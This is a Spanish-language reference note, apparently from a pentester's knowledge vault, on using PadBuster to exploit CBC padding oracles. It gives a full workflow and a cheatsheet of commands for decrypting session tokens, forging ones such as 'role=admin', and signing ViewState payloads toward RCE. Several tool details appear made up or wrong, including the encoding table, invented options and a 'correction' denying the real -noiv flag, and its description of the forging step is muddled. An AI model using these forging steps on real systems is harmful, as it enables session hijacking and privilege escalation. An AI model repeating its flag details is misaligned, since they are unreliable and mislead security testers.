---
tags:
  - ciberseguridad
  - herramientas
  - padbuster
tipo: herramienta
estado: terminado
---

# PadBuster

**PadBuster** es la herramienta de referencia para explotar **padding oracles** (ataques de relleno, tipo Vaudenay) contra cualquier cifrado en modo CBC que filtre, por cualquier canal, si el relleno PKCS#7 de un bloque es válido o no. Descifra textos cifrados ajenos, genera texto cifrado con contenido elegido y — el caso de oro — **forja tokens de seguridad** ( ViewState firmado, cookies de sesión, "recordar contraseña") sin conocer la clave.

> [!info] El ataque en una frase
> Si la aplicación te dice, sea como sea, "relleno inválido" vs "relleno válido", con ~128 peticiones por byte recuperas el texto plano completo, byte a byte, y con ~2 bloques añadidos puedes firmarte cualquier contenido. La clave secreta nunca se deduce; el oracle (la filtración) es el bug. La teoría completa vive en [[Ataque de Oráculo de Relleno]] — esta nota es la práctica con PadBuster.

### Mecánica del ataque en cifras (lo que PadBuster automatiza)

CBC descifra `Pᵢ = D(Cᵢ) ⊕ Cᵢ₋₁`. El atacante controla `Cᵢ₋₁` y observa si el servidor valida el relleno de `Pᵢ`:

1. **Fase 1 — recuperar el byte intermedio**: probando el último byte de `Cᵢ₋₁` (256 valores), encuentra el valor `m` que produce relleno `0x01` válido → `m = D(Cᵢ)[last] ⊕ 1`. Coste: ≤128 peticiones (media) por byte.
2. **Fase 2 — extender a los 16 bytes**: conocidos los rellenos `0x01…0x10`, se inyectan masks ajustadas byte a byte para derivar todos los bytes de `D(Cᵢ)`; con ellos, `Pᵢ = D(Cᵢ) ⊕ Cᵢ₋₁` (real) sale sin ninguna petición extra.
3. **Repetición**: bajando de bloque en bloque hasta el bloque 1 (el bloque 0 es el IV, con su propia fase de 256 pruebas).
4. **Cifrado de contenido elegido**: se elige `P` deseado y se calcula hacia atrás un `C₀` tal que `C₀ = E(P₁ ⊕ C_prev_falso)` simulando un bloque "cifrado" — por eso forjar requiere solo ~2 bloques y el mismo oracle.

Todo el coste vive en la fase 1: de ahí el `~128 peticiones/byte` que PadBuster reporta en su estimación — y por qué un token de 32 bytes son ~4 000 peticiones.

> [!warning] Autorización y impacto
> El ataque requiere **cientos a miles de peticiones** por objetivo (visibles en logs y WAF como ráfaga sobre el mismo parámetro). Es estándar en engagements web autorizados, pero es denegación de servicio colateral si el oracle es lento. Verificar siempre el alcance antes; un ViewState forjado equivale a RCE en ASP.NET clásico — documentarlo como hallazgo crítico en el informe ([[Creación de Informes en LaTeX]]).

## Requisitos del ataque (checklist del oracle)

Para que PadBuster funcione necesita **las cuatro patas**:

| Requisito | Qué buscar |
|---|---|
| 1. Un valor cifrado en CBC **manipulable** | Cookie, parámetro POST, ViewState, header — con IV prepended (lo habitual) o implícito |
| 2. Un **oracle** diferenciable | Mensaje de error distinto, código HTTP distinto (500 vs 200), longitud de respuesta distinta o **diferencia de timing** |
| 3. El **modo** correcto | CBC (AES: bloque 16, 3DES/DES: bloque 8) |
| 4. La **codificación** del texto cifrado | Hex, Base64, ASCII… la que usa la aplicación |

Los oráculos clásicos en ASP.NET: `Validation of viewstate MAC failed`, `The state information is invalid`, `Padding is invalid and cannot be removed` (este último mensaje exacto = el servidor usa el oráculo por excelencia).

## Instalación

| Contexto | Comando |
|---|---|
| Repositorio oficial | `git clone https://github.com/GDSSecurity/PadBuster` |
| Kali | `sudo apt install padbuster` (o clonar; es un script Perl) |
| Dependencias | Perl + `perl -MIO::Socket::SSL` (HTTPS); el resto, librerías estándar |

```bash
perl padbuster.pl            # sin args imprime el uso
```

> [!tip] PadBuster está en mantenimiento mínimo (2021)
> Para objetivos modernos también existen **PaddingOracle2** (Python, más rápido y multihilo) y scripts propios sobre `requests`. La sintaxis de PadBuster es sin embargo el estándar de facto: guías, plantillas de informe y writeups la dan por supuesta.

## Sintaxis y parámetros posicionales

```bash
perl padbuster.pl <URL_o_archivo> <muestra_cifrada> <tamaño_bloque> [opciones]
```

| Posición | Parámetro | Qué es | Ejemplo |
|---|---|---|---|
| 1 | `URL` | Endpoint que procesa el valor cifrado y devuelve el oracle. Con `-in` se sustituye por fichero | `https://app/login.aspx` |
| 2 | `muestra_cifrada` | El texto cifrado legítimo capturado (en la codificación `-encoding`) | `3A7F...=` |
| 3 | `block_size` | Bytes por bloque: **16** (AES), **8** (DES/3DES/RC2) | `16` |

> [!info] El bloque 0 es el IV
> PadBuster asume que los primeros `block_size` bytes son el **IV prepended** (convención estándar de CBC) y empieza el ataque por el bloque 1. Si la aplicación guarda el IV aparte o usa IV aleatorio interno, usa `-b`/`--bruteforce` para recuperar el bloque 0.

### Opciones

| Opción | Significado | Ejemplo |
|---|---|---|
| `-encoding=<n>` | Codificación de la muestra: **0=ASCII (literal), 1=Hex, 2=Base64, 3=Base64 doblemente codificado** (defecto 0) | `-encoding=2` |
| `-error=<texto\|archivo>` | Cadena que identifica el **oracle** (la respuesta de relleno inválido); también puede ser un fichero de respuestas | `-error="Validation of viewstate"` |
| `-ciphertext=<datos>` | Texto cifrado alternativo a la muestra (descifrar otro valor con el mismo oracle) | `-ciphertext=9F3A...` |
| `-plaintext=<datos>` | Modo de **cifrado**: genera texto cifrado válido para ese texto plano (forjar) | `-plaintext="user=admin"` |
| `-prefix=<datos>` | Prefijo de texto plano que la aplicación añade antes de lo que tú controlas | `-prefix="userid=1"` |
| `-b`, `--bruteforce` | Recupera el bloque 0 (IV) por fuerza bruta | `-b` |
| `-o`, `--oracle=<script>` | Oracle **personalizado**: script propio en lugar del HTTP genérico | `-o oracle.pl` |
| `-p`, `--probe=<script>` | Sonda del oracle personalizado (diagnóstico) | `-p probe.pl` |
| `-in <archivo>` | Lee la muestra de un fichero (flujo "desde Burp") | `-in sample.b64` |
| `-l`, `--log` | Log completo del ataque (para informe) | `-l ataque.log` |
| `-radix` | Muestra los bytes de respuesta en hexadecimal (con oracle propio) | `-radix` |
| `-ignore-cache` | No reutiliza respuestas cacheadas del oracle (script propio) | |

> [!warning] Correcciones sobre flags que circulan por guías antiguas
> - **`-encoding` NO es "0=Base64, 1=Hex"**: es `0=ASCII, 1=Hex, 2=Base64, 3=Double-Encoded Base64`. Invertirlo produce cientos de peticiones absurdas que nunca dan el ataque.
> - **`-noiv` y `-postfix` no existen** como opciones de PadBuster: el IV se maneja solo (o con `-b`), y el "sufijo" de texto plano se logra encadenando bloques desde `-plaintext`/`-prefix`.

## Flujo de trabajo completo (objeto típico: cookie ASP.NET)

### Paso 1 — Capturar la muestra y el oracle (Burp)

1. Interceptar la petición con la cookie `ASP.NET_SessionId`/`__VIEWSTATE` cifrada.
2. Enviar la petición **10 veces sin tocar nada** → confirmar estabilidad de la respuesta.
3. Cambiar el **último byte** del valor (en su codificación) y reenviar:
   - Si la respuesta cambia (error 500, mensaje distinto, longitud distinta) → **tienes oracle**.
4. Anotar: URL del endpoint, nombre del parámetro, codificación (Base64 si termina en `=`, hex si solo `[0-9a-f]`), tamaño de bloque (16 salvo evidencia de 8).

### Paso 2 — Descifrar

```bash
perl padbuster.pl "https://app.local/pagina.aspx" \
  "7dKL3a8x9Ck5Vt2mZqR0Ww4jHpNcYbE1sXuA==" \
  16 -encoding=2 -error="Validation of viewstate" -log descifra.log
```

PadBuster lanza su **fase de auto-detección**: prueba bloques manipulados, clasifica la respuesta como "valid" o "error", y estima el número de peticiones. Tras confirmar el oracle pregunta:

```
Do you want to abort?  (y = no, N = yes): N
```

Responder `N` y dejar correr. Salida por bloque:

```
[+] Decrypted Block 1: 7573657269643d313031... (ascii: userid=101...)
[+] Decrypted Block 2: 26726f6c653d75736572 (ascii: &role=user)
[+] Decrypted Full Plaintext: userid=101&role=user
```

### Paso 3 — Forjar (cifrado de contenido elegido)

```bash
perl padbuster.pl "https://app.local/pagina.aspx" \
  "7dKL3a8x9Ck5Vt2mZqR0Ww4jHpNcYbE1sXuA==" \
  16 -encoding=2 -error="Validation of viewstate" \
  -plaintext="userid=101&role=admin"
```

Resultado: un valor cifrado **válido** que el servidor aceptará como si lo hubiera generado él. Ajustar el `padding` final lo gestiona la herramienta; si el servidor espera longitud fija, recortar bloques alineados (plaintext múltiplo del bloque menos 2 de relleno, o usar `-prefix` para compensar).

### Paso 4 — Verificar y explotar

- Reenviar el token forjado y comprobar el efecto (acceso como admin, estado alterado).
- Para ViewState: `-plaintext` con el payload (p. ej. serialized .NET) lleva directamente a RCE — los payloads deysys/gadget chains se generan con otras herramientas; PadBuster solo produce el bloque CBC que lo firma.

## Estrategias por tipo de objetivo

| Objetivo | Estrategia |
|---|---|
| Cookie/param Base64 estándar | Receta anterior directa |
| Token con IV **no** prepended (aleatorio interno) | `-b` para recuperar el bloque 0 |
| Oracle con respuesta binaria o no-HTTP | `-o` script propio que devuelva 0/1 |
| Oracle de **timing** | Script propio midiendo diferencias de ms (PadBuster HTTP genérico no lo modela bien) |
| Objeto con longitud fija | Forjar plaintext múltiplo de 16 bytes rellenado a medida |
| Parámetro en el **medio** de una estructura conocida | `-prefix` con el texto que precede a tu control |
| Descifrar otro token del mismo sistema | `-ciphertext=<nuevo valor>` reutilizando el oracle calibrado |

### Oracle personalizado (esqueleto)

```perl
# oracle.pl — devuelve 0 (inválido) / 1 (válido) por salida estándar
# PadBuster pasa el texto cifrado candidato y espera una respuesta clasificable
#!/usr/bin/perl
# ... usa IO::Socket::SSL para enviar el token modificado ...
# Imprime "1" si la respuesta es la de relleno válido, "0" si es la de error
```

Con `-o` PadBuster se ocupa del bucle de ataques; tu script solo traduce la pregunta del ataque a la pregunta concreta de la aplicación.

## Interpretación de la salida y métricas

| Señal | Significado |
|---|---|
| `[+] Estimated result: X of Y requests` | Coste estimado: ~128 peticiones/byte por diseño del ataque (fase 2: adivinar 1 byte de relleno) |
| Bloque descifrado con texto legible | El oracle es real y correcto — seguir |
| Bloques con `\xNN` a ristra | Texto plano con binario esperado (ViewState serializado, datos .NET) — normal |
| `Error: HTTP 0` / sin clasificación | El oracle dejó de diferenciar: o bien el WAF empezó a bloquear, o el endpoint cambió comportamiento |
| Ataque muy lento | El oracle es una aplicación completa (no un simple hash); considerar `-o` con respuesta cacheada o migrar a PaddingOracle2 |

## Errores comunes (con mensajes exactos)

| Mensaje / síntoma | Causa | Fix |
|---|---|---|
| `Error: Make sure the error string is accurate` / no detecta oracle | `-error` no coincide con la respuesta real | Copiar **subcadena exacta** del error; o un archivo con varias variantes |
| `The sample is not a multiple of the block size` | Muestra cortada (mal copiada) o encoding equivocado | Revisar `-encoding` y copia completa del token |
| `Unable to detect server response` | Oracle por código HTTP distinto, no por texto | Dejar `-error` y ver la ayuda: PadBuster detecta códigos; si no, script propio |
| Cientos de peticiones y `Bad Padding` siempre | `-encoding` invertido (el error #1) | `2` para Base64, `1` para hex — recordar la tabla real |
| `connect() to ... failed` (HTTPS) | Perl sin IO::Socket::SSL | Instalar `libio-socket-ssl-perl` |
| El plaintext forjado "no cabe" | Longitud del objetivo fija o relleno intermedio esperado | Alinear a bloques; usar `-prefix`; probar con longitud-16 y longitud-32 |
| Respuestas 429/403 tras unas pocas peticiones | WAF/rate-limit | Pausar, o oracle propio con delay, o autorizar throttling en el alcance |

## Cheatsheet

```bash
# Autodetección + descifrar (Base64, AES-16, error de viewstate)
perl padbuster.pl <URL> <token_b64> 16 -encoding=2 -error="Validation of viewstate"

# Hex y bloque 8 (3DES)
perl padbuster.pl <URL> <token_hex> 8 -encoding=1 -error="Padding is invalid"

# Recuperar IV (bloque 0)
perl padbuster.pl <URL> <token_b64> 16 -encoding=2 -error="..." -b

# Forjar token
perl padbuster.pl <URL> <token_b64> 16 -encoding=2 -error="..." -plaintext="role=admin"

# Con prefijo (controlas el medio del valor)
perl padbuster.pl <URL> <token_b64> 16 -encoding=2 -error="..." -prefix="user=1&" -plaintext="role=admin"

# Descifrar otro token reutilizando el calibrado
perl padbuster.pl <URL> <token_b64> 16 -encoding=2 -error="..." -ciphertext=<otro_token>

# Oracle personalizado + log para informe
perl padbuster.pl <URL> <token_b64> 16 -encoding=2 -o oracle.pl -l ataque.log
```

## Referencias

- Repositorio oficial (GDSSecurity): <https://github.com/GDSSecurity/PadBuster>
- Artículo fundacional: Vaudenay, "A Practical Attack on CBC Mode Encryption with Padding" (2002)
- Máquina de estados del ataque: [[Ataque de Oráculo de Relleno]] (nota de conceptos del vault)
- Contexto criptográfico y TLS: [[OpenSSL Comandos Principales]]
- Oráculos de relleno en TLS (Bleichenbacher/ROBOT): ver también [[SSLyze Analizador SSL TLS]] (`--robot`)

## Relacionadas

- [[Ataque de Oráculo de Relleno]] — la teoría completa (bloques, XOR, máscaras)
- [[OpenSSL Comandos Principales]] — generar/inspeccionar los objetos cifrados
- [[WFuzz]] / [[Gobuster]] — fuzzing del endpoint para estabilizar el oracle
- [[Creación de Informes en LaTeX]] — documentar el ataque byte a byte con evidencias
